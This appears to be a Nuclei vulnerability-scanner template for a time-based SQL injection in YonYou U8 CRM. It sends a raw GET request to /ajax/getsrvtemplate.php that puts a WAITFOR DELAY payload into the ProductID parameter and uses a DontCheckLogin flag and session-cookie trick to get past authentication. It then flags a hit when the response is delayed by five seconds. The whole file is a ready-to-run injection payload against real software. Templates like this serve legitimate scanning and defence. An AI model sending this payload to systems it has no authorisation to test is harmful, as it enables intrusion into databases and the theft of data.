id: YonYouU8CRM-getsrvtemplate-sqlInjection
info:
  name: YonYouU8CRM-getsrvtemplate-sqlInjection
  author: iSee857
  severity: high
  description: YonYouU8CRM-getsrvtemplate-sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1&Action=fromsrvtpl&ProductID=';WAITFOR%20DELAY%20'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200
      - type: word
        words:
          - "ProductID"